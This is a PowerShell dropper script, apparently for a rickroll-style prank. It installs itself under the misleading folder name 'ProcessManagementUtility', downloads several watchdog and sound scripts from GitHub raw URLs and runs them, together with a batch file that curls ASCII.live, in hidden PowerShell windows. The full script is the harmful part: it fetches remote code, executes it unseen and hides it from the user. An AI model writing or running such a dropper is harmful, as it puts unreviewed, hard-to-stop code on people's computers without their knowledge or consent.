$installDir = "$HOME\ProcessManagementUtility\"

if (!(Test-Path -Path "$installDir")) {
    New-Item -ItemType Directory -Path "$installDir"
}

#! rickroll.bat
Set-Location -Path "$installDir"
Set-Content -Path "rickroll.bat" -Value 'curl ASCII.live/can-you-hear-me'

#! watchdog0.ps1
$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/watchdog0.ps1"
$output = "$installDir\watchdog0.ps1"
Invoke-WebRequest -Uri $url -OutFile $output

#! watchdog1.ps1
$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/watchdog1.ps1"
$output = "$installDir\watchdog1.ps1"
Invoke-WebRequest -Uri $url -OutFile $output

#! sound.ps1
$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/sound.ps1"
$output = "$installDir\sound.ps1"
Invoke-WebRequest -Uri $url -OutFile $output

#! getPID.bat
$url = "https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/getCmdPID.bat"
$output = "$installDir\getPID.bat"
Invoke-WebRequest -Uri $url -OutFile $output


#! handle all started functions
Set-Location -Path "$installDir"
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './watchdog0.ps1'"
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './watchdog1.ps1'"
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './sound.ps1'"
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './rickroll.bat'"

exit 0